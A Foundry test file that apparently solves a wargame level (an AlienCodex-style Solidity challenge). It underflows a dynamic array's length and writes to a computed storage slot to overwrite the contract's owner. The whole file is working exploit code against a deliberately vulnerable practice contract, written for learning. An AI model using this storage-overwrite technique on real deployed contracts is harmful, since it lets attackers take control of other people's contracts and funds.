// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Level19.sol";

contract Level19Test is Test {
    Level19 public level19;

    function setUp() public {
      // Add ether
      vm.deal(vm.addr(1), 6 ether);

      //Deploy contract
      vm.startPrank(vm.addr(1));
      level19 = new Level19();
      vm.stopPrank();

    }

    //TODO: find a way to compile into sol 0.5 with foundry, script working because Interface ok.

    function testLevel19() public {
      vm.prank(vm.addr(2));

      //Contact the contract
      level19.make_contact();

      //Underflow the length of codex
      level19.retract();

      // Slot of the codex length
      bytes32 codex_index = keccak256((abi.encodePacked(uint256(1))));

      //Slot of the owner address
      uint256 owner_index = 2 ** 256 - 1 - uint(codex_index) + 1;

      //Overflow the owner address by targeting it's address with our address
      level19.revise(owner_index, bytes32(uint256(uint160(address(vm.addr(2)))))); //Transform address into bytes32
      console.log(level19.owner());
      vm.stopPrank();
    }
}
